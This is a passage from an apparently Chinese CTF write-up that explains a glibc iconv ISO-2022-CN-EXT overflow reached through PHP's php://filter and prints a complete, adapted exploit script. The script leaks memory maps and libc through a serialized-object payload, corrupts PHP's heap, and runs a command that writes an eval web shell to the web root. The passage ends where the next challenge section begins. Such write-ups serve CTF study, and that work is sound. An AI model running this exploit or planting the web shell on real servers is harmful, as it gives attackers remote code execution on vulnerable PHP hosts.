src="/./ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/w_2_1.png"></p><p>这只是第一步，后边要利用 <code>file_get_contents($this-&gt;filename);</code> 来rce。</p><p>参考链接：<a href="https://xz.aliyun.com/t/14690?time__1311=mqmx9QDtDQ0=ex0y34+g6YG8bou8xGIxx">【翻译】从设置字符集到RCE：利用 GLIBC 攻击 PHP 引擎（篇一）</a></p><p>​                    <a href="https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py">EXP</a></p><p>基本原理就是 iconv 在转换  ISO-2022-CN-EXT 时出现越界写入，<code>iconv</code> 是 <code>php://filter/</code> 使用过滤器时会使用的函数，后边就是pwn的知识了。</p><p>更简单的流程就是，先读出php所使用的 libc 和所使用堆的基地址，然后通过缓冲区溢出的越界写入，实现地址覆盖，调用 libc 里面的函数， 从而rce。</p><p>脚本所需依赖安装：</p><p><strong><a href="https://github.com/cfreal/ten">ten</a></strong> ：按照里面的说明进行安装。</p><p>pwntools: 在linux下安装，windows 要装 winpwntools</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure><p>EXP:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> ten <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">HEAP_SIZE = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">BUG = <span class="string">&quot;劄&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://1e978a69-8ead-4157-8af7-839756b45872.challenge.ctf.show/&quot;</span></span><br><span class="line">command: <span class="built_in">str</span> = <span class="string">&quot;echo &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;&gt;/var/www/html/1.php;&quot;</span></span><br><span class="line">sleep: <span class="built_in">int</span> = <span class="number">1</span></span><br><span class="line">PAD: <span class="built_in">int</span> = <span class="number">20</span></span><br><span class="line">pad: <span class="built_in">int</span> = <span class="number">20</span></span><br><span class="line">info = &#123;&#125;</span><br><span class="line">heap = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Region</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A memory region.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    start: <span class="built_in">int</span></span><br><span class="line">    stop: <span class="built_in">int</span></span><br><span class="line">    permissions: <span class="built_in">str</span></span><br><span class="line">    path: <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">size</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> self.stop - self.start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 /proc/self/maps</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_maps</span>():</span><br><span class="line">data = <span class="string">&#x27;?read=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9f%9fa%f0%9f%9fa&amp;start=O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:59:&quot;php://filter/convert.base64-encode/resource=/proc/self/maps&quot;;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url+data).text</span><br><span class="line"><span class="comment"># print(r)</span></span><br><span class="line">data = re.search(<span class="string">&quot;What you are reading is:(.*)&quot;</span>, r).group(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># print(txt)</span></span><br><span class="line"><span class="keyword">return</span> b64decode(data)</span><br><span class="line"><span class="comment"># 获取 libc</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>(<span class="params">get_file , local_path</span>):</span><br><span class="line">filename = <span class="string">&quot;php://filter/convert.base64-encode/resource=&quot;</span>+get_file</span><br><span class="line">data = <span class="string">&#x27;?read=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9f%9fa%f0%9f%9fa&amp;start=O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:[num]:&quot;[filename]&quot;;&#125;&#x27;</span></span><br><span class="line">data = data.replace(<span class="string">&#x27;[num]&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(filename)))</span><br><span class="line">data = data.replace(<span class="string">&#x27;[filename]&#x27;</span>,filename)</span><br><span class="line">r = requests.get(url + data).text</span><br><span class="line">data = re.search(<span class="string">&quot;What you are reading is:(.*)&quot;</span>, r).group(<span class="number">1</span>)</span><br><span class="line">data = b64decode(data)</span><br><span class="line"><span class="built_in">open</span>(local_path,<span class="string">&#x27;wb&#x27;</span>).write(data)</span><br><span class="line"><span class="comment"># Path(local_path).write(data)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_regions</span>():</span><br><span class="line">maps = get_maps()</span><br><span class="line">maps = maps.decode()</span><br><span class="line">PATTERN = re.<span class="built_in">compile</span>(</span><br><span class="line"><span class="string">r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot;</span> <span class="string">r&quot;.*&quot;</span> <span class="string">r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot;</span> <span class="string">r&quot;(.*)&quot;</span></span><br><span class="line">)</span><br><span class="line">regions = []</span><br><span class="line"><span class="keyword">for</span> region <span class="keyword">in</span> table.split(maps, strip=<span class="literal">True</span>):</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">match</span> := PATTERN.<span class="keyword">match</span>(region):</span><br><span class="line">start = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">stop = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">permissions = <span class="keyword">match</span>.group(<span class="number">3</span>)</span><br><span class="line">path = <span class="keyword">match</span>.group(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;/&quot;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;[&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">path = path.rsplit(<span class="string">&quot; &quot;</span>, <span class="number">1</span>)[-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">path = <span class="string">&quot;&quot;</span></span><br><span class="line">current = Region(start, stop, permissions, path)</span><br><span class="line">regions.append(current)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(maps)</span><br><span class="line"><span class="comment"># failure(&quot;Unable to parse memory mappings&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># self.log.info(f&quot;Got &#123;len(regions)&#125; memory regions&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> regions</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 /proc/self/maps 得到 堆地址</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_main_heap</span>(<span class="params">regions: <span class="built_in">list</span>[Region]</span>) -&gt; Region:</span><br><span class="line"><span class="comment"># Any anonymous RW region with a size superior to the base heap size is a</span></span><br><span class="line"><span class="comment"># candidate. The heap is at the bottom of the region.</span></span><br><span class="line">heaps = [</span><br><span class="line">region.stop - HEAP_SIZE + <span class="number">0x40</span></span><br><span class="line"><span class="keyword">for</span> region <span class="keyword">in</span> <span class="built_in">reversed</span>(regions)</span><br><span class="line"><span class="keyword">if</span> region.permissions == <span class="string">&quot;rw-p&quot;</span></span><br><span class="line"><span class="keyword">and</span> region.size &gt;= HEAP_SIZE</span><br><span class="line"><span class="keyword">and</span> region.stop &amp; (HEAP_SIZE - <span class="number">1</span>) == <span class="number">0</span></span><br><span class="line"><span class="keyword">and</span> region.path == <span class="string">&quot;&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> heaps:</span><br><span class="line">failure(<span class="string">&quot;Unable to find PHP&#x27;s main heap in memory&quot;</span>)</span><br><span class="line"></span><br><span class="line">first = heaps[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(heaps) &gt; <span class="number">1</span>:</span><br><span class="line">heaps = <span class="string">&quot;, &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">hex</span>, heaps))</span><br><span class="line">msg_info(<span class="string">f&quot;Potential heaps: [i]<span class="subst">&#123;heaps&#125;</span>[/] (using first)&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">msg_info(<span class="string">f&quot;Using [i]<span class="subst">&#123;<span class="built_in">hex</span>(first)&#125;</span>[/] as heap&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> first</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_get_region</span>(<span class="params">regions: <span class="built_in">list</span>[Region], *names: <span class="built_in">str</span></span>) -&gt; Region:</span><br><span class="line"><span class="string">&quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> region <span class="keyword">in</span> regions:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">any</span>(name <span class="keyword">in</span> region.path <span class="keyword">for</span> name <span class="keyword">in</span> names):</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">failure(<span class="string">&quot;Unable to locate region&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> region</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载 libc 文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_symbols_and_addresses</span>():</span><br><span class="line">regions = get_regions()</span><br><span class="line">LIBC_FILE = <span class="string">&quot;/dev/shm/cnext-libc&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP&#x27;s heap</span></span><br><span class="line"></span><br><span class="line">info[<span class="string">&quot;heap&quot;</span>] = heap <span class="keyword">or</span> find_main_heap(regions)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Libc</span></span><br><span class="line"></span><br><span class="line">libc = _get_region(regions, <span class="string">&quot;libc-&quot;</span>, <span class="string">&quot;libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">download_file(libc.path, LIBC_FILE)</span><br><span class="line"></span><br><span class="line">info[<span class="string">&quot;libc&quot;</span>] = ELF(LIBC_FILE, checksec=<span class="literal">False</span>)</span><br><span class="line">info[<span class="string">&quot;libc&quot;</span>].address = libc.start</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compress</span>(<span class="params">data</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns data suitable for `zlib.inflate`.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># Remove 2-byte header and 4-byte checksum</span></span><br><span class="line">    <span class="keyword">return</span> zlib.compress(data, <span class="number">9</span>)[<span class="number">2</span>:-<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64</span>(<span class="params">data: <span class="built_in">bytes</span>, misalign=<span class="literal">True</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    payload = b64encode(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> misalign <span class="keyword">and</span> payload.endswith(<span class="string">&quot;=&quot;</span>):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Misaligned: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compressed_bucket</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns a chunk of size 0x8000 that, when dechunked, returns the data.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> chunked_chunk(data, <span class="number">0x8000</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qpe</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Emulates quoted-printable-encode.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(<span class="string">f&quot;=<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> data).upper().encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ptr_bucket</span>(<span class="params">*ptrs, size=<span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Creates a 0x8000 chunk that reveals pointers after every step has been ran.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(ptrs) * <span class="number">8</span> == size</span><br><span class="line">    bucket = <span class="string">b&quot;&quot;</span>.join(<span class="built_in">map</span>(p64, ptrs))</span><br><span class="line">    bucket = qpe(bucket)</span><br><span class="line">    bucket = chunked_chunk(bucket)</span><br><span class="line">    bucket = chunked_chunk(bucket)</span><br><span class="line">    bucket = chunked_chunk(bucket)</span><br><span class="line">    bucket = compressed_bucket(bucket)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bucket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chunked_chunk</span>(<span class="params">data: <span class="built_in">bytes</span>, size: <span class="built_in">int</span> = <span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Constructs a chunked representation of the given chunk. If size is given, the</span></span><br><span class="line"><span class="string">    chunked representation has size `size`.</span></span><br><span class="line"><span class="string">    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># The caller does not care about the size: let&#x27;s just add 8, which is more than</span></span><br><span class="line">    <span class="comment"># enough</span></span><br><span class="line">    <span class="keyword">if</span> size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        size = <span class="built_in">len</span>(data) + <span class="number">8</span></span><br><span class="line">    keep = <span class="built_in">len</span>(data) + <span class="built_in">len</span>(<span class="string">b&quot;\n\n&quot;</span>)</span><br><span class="line">    size = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">len</span>(data):x&#125;</span>&quot;</span>.rjust(size - keep, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> size.encode() + <span class="string">b&quot;\n&quot;</span> + data + <span class="string">b&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 攻击 payload 的生成</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_exploit_path</span>() -&gt; <span class="built_in">str</span>:</span><br><span class="line">LIBC = info[<span class="string">&quot;libc&quot;</span>]</span><br><span class="line">ADDR_EMALLOC = LIBC.symbols[<span class="string">&quot;__libc_malloc&quot;</span>]</span><br><span class="line">ADDR_EFREE = LIBC.symbols[<span class="string">&quot;__libc_system&quot;</span>]</span><br><span class="line">ADDR_EREALLOC = LIBC.symbols[<span class="string">&quot;__libc_realloc&quot;</span>]</span><br><span class="line"></span><br><span class="line">ADDR_HEAP = info[<span class="string">&quot;heap&quot;</span>]</span><br><span class="line">ADDR_FREE_SLOT = ADDR_HEAP + <span class="number">0x20</span></span><br><span class="line">ADDR_CUSTOM_HEAP = ADDR_HEAP + <span class="number">0x0168</span></span><br><span class="line"></span><br><span class="line">ADDR_FAKE_BIN = ADDR_FREE_SLOT - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">CS = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pad needs to stay at size 0x100 at every step</span></span><br><span class="line">pad_size = CS - <span class="number">0x18</span></span><br><span class="line">pad = <span class="string">b&quot;\x00&quot;</span> * pad_size</span><br><span class="line">pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)</span><br><span class="line">pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)</span><br><span class="line">pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)</span><br><span class="line">pad = compressed_bucket(pad)</span><br><span class="line"></span><br><span class="line">step1_size = <span class="number">1</span></span><br><span class="line">step1 = <span class="string">b&quot;\x00&quot;</span> * step1_size</span><br><span class="line">step1 = chunked_chunk(step1)</span><br><span class="line">step1 = chunked_chunk(step1)</span><br><span class="line">step1 = chunked_chunk(step1, CS)</span><br><span class="line">step1 = compressed_bucket(step1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span></span><br><span class="line"><span class="comment"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;</span></span><br><span class="line"></span><br><span class="line">step2_size = <span class="number">0x48</span></span><br><span class="line">step2 = <span class="string">b&quot;\x00&quot;</span> * (step2_size + <span class="number">8</span>)</span><br><span class="line">step2 = chunked_chunk(step2, CS)</span><br><span class="line">step2 = chunked_chunk(step2)</span><br><span class="line">step2 = compressed_bucket(step2)</span><br><span class="line"></span><br><span class="line">step2_write_ptr = <span class="string">b&quot;0\n&quot;</span>.ljust(step2_size, <span class="string">b&quot;\x00&quot;</span>) + p64(ADDR_FAKE_BIN)</span><br><span class="line">step2_write_ptr = chunked_chunk(step2_write_ptr, CS)</span><br><span class="line">step2_write_ptr = chunked_chunk(step2_write_ptr)</span><br><span class="line">step2_write_ptr = compressed_bucket(step2_write_ptr)</span><br><span class="line"></span><br><span class="line">step3_size = CS</span><br><span class="line"></span><br><span class="line">step3 = <span class="string">b&quot;\x00&quot;</span> * step3_size</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(step3) == CS</span><br><span class="line">step3 = chunked_chunk(step3)</span><br><span class="line">step3 = chunked_chunk(step3)</span><br><span class="line">step3 = chunked_chunk(step3)</span><br><span class="line">step3 = compressed_bucket(step3)</span><br><span class="line"></span><br><span class="line">step3_overflow = <span class="string">b&quot;\x00&quot;</span> * (step3_size - <span class="built_in">len</span>(BUG)) + BUG</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(step3_overflow) == CS</span><br><span class="line">step3_overflow = chunked_chunk(step3_overflow)</span><br><span class="line">step3_overflow = chunked_chunk(step3_overflow)</span><br><span class="line">step3_overflow = chunked_chunk(step3_overflow)</span><br><span class="line">step3_overflow = compressed_bucket(step3_overflow)</span><br><span class="line"></span><br><span class="line">step4_size = CS</span><br><span class="line">step4 = <span class="string">b&quot;=00&quot;</span> + <span class="string">b&quot;\x00&quot;</span> * (step4_size - <span class="number">1</span>)</span><br><span class="line">step4 = chunked_chunk(step4)</span><br><span class="line">step4 = chunked_chunk(step4)</span><br><span class="line">step4 = chunked_chunk(step4)</span><br><span class="line">step4 = compressed_bucket(step4)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This chunk will eventually overwrite mm_heap-&gt;free_slot</span></span><br><span class="line"><span class="comment"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span></span><br><span class="line">step4_pwn = ptr_bucket(</span><br><span class="line"><span class="number">0x200000</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="comment"># free_slot</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">ADDR_CUSTOM_HEAP,  <span class="comment"># 0x18</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">ADDR_HEAP,  <span class="comment"># 0x140</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">size=CS,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">step4_custom_heap = ptr_bucket(</span><br><span class="line">ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=<span class="number">0x18</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">step4_use_custom_heap_size = <span class="number">0x140</span></span><br><span class="line"></span><br><span class="line">COMMAND = command</span><br><span class="line">COMMAND = <span class="string">f&quot;kill -9 $PPID; <span class="subst">&#123;COMMAND&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">if</span> sleep:</span><br><span class="line">COMMAND = <span class="string">f&quot;sleep <span class="subst">&#123;sleep&#125;</span>; <span class="subst">&#123;COMMAND&#125;</span>&quot;</span></span><br><span class="line">COMMAND = COMMAND.encode() + <span class="string">b&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> (</span><br><span class="line"><span class="built_in">len</span>(COMMAND) &lt;= step4_use_custom_heap_size</span><br><span class="line">), <span class="string">f&quot;Command too big (<span class="subst">&#123;<span class="built_in">len</span>(COMMAND)&#125;</span>), it must be strictly inferior to <span class="subst">&#123;<span class="built_in">hex</span>(step4_use_custom_heap_size)&#125;</span>&quot;</span></span><br><span class="line">COMMAND = COMMAND.ljust(step4_use_custom_heap_size, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">step4_use_custom_heap = COMMAND</span><br><span class="line">step4_use_custom_heap = qpe(step4_use_custom_heap)</span><br><span class="line">step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)</span><br><span class="line">step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)</span><br><span class="line">step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)</span><br><span class="line">step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)</span><br><span class="line"></span><br><span class="line">pages = (</span><br><span class="line">step4 * <span class="number">3</span></span><br><span class="line">+ step4_pwn</span><br><span class="line">+ step4_custom_heap</span><br><span class="line">+ step4_use_custom_heap</span><br><span class="line">+ step3_overflow</span><br><span class="line">+ pad * PAD</span><br><span class="line">+ step1 * <span class="number">3</span></span><br><span class="line">+ step2_write_ptr</span><br><span class="line">+ step2 * <span class="number">2</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">resource = compress(compress(pages))</span><br><span class="line">resource = b64(resource)</span><br><span class="line">resource = <span class="string">f&quot;data:text/plain;base64,<span class="subst">&#123;resource.decode()&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">filters = [</span><br><span class="line"><span class="comment"># Create buckets</span></span><br><span class="line"><span class="string">&quot;zlib.inflate&quot;</span>,</span><br><span class="line"><span class="string">&quot;zlib.inflate&quot;</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 0: Setup heap</span></span><br><span class="line"><span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line"><span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: Reverse FL order</span></span><br><span class="line"><span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line"><span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Put fake pointer and make FL order back to normal</span></span><br><span class="line"><span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line"><span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: Trigger overflow</span></span><br><span class="line"><span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line"><span class="string">&quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span></span><br><span class="line"><span class="string">&quot;convert.quoted-printable-decode&quot;</span>,</span><br><span class="line"><span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line">]</span><br><span class="line">filters = <span class="string">&quot;|&quot;</span>.join(filters)</span><br><span class="line">path = <span class="string">f&quot;php://filter/read=<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;resource&#125;</span>&quot;</span></span><br><span class="line"><span class="comment"># print(path)</span></span><br><span class="line"><span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始攻击。攻击返回404是成功的标志，因为 command 最前面把进程 kill 掉了</span></span><br><span class="line"><span class="comment"># COMMAND = f&quot;kill -9 $PPID; &#123;COMMAND&#125;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">path = build_exploit_path()</span><br><span class="line">start = time.time()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">data = <span class="string">&#x27;?read=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9f%9fa%f0%9f%9fa%f0%9f%9fa&amp;start=O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:[num]:&quot;[data]&quot;;&#125;&#x27;</span></span><br><span class="line">        </span><br><span class="line">data = data.replace(<span class="string">&#x27;[num]&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(path)))</span><br><span class="line">data = data.replace(<span class="string">&#x27;[data]&#x27;</span>, quote(path))</span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line">r = requests.get(url + data).text</span><br><span class="line"><span class="comment"># print(&quot;r: &quot;,r)</span></span><br><span class="line">data = re.search(<span class="string">&quot;What you are reading is:(.*)&quot;</span>, r).group(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-----end-----&#x27;</span>)</span><br><span class="line"><span class="comment"># print(&quot;data； &quot;,data)</span></span><br><span class="line">data = b64decode(data)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Error&quot;</span>)</span><br><span class="line"></span><br><span class="line">msg_print()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> sleep:</span><br><span class="line">msg_print(<span class="string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> start + sleep &lt;= time.time():</span><br><span class="line">msg_print(<span class="string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="comment"># Wrong heap, maybe? If the exploited suggested others, use them!</span></span><br><span class="line">msg_print(<span class="string">&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;</span>)</span><br><span class="line"></span><br><span class="line">msg_print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_symbols_and_addresses()</span><br><span class="line"><span class="built_in">print</span>(info)</span><br><span class="line">exploit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/./ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/w_2_2.png"></p><p>攻击成功后，访问 <code>1.php</code>，即可利用写入的马来rce。</p><p><img src="/./ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/w_2_3.png"></p><h2 id="tpdoor"><a href="#tpdoor" class="headerlink" title="tpdoor"></a>tpdoor</h2><p>根据图标可以知道这是 <code>thinkphp</code> ，通过报错可知这是 <code>ThinkPHP V8.0.3 </code></p><p><img 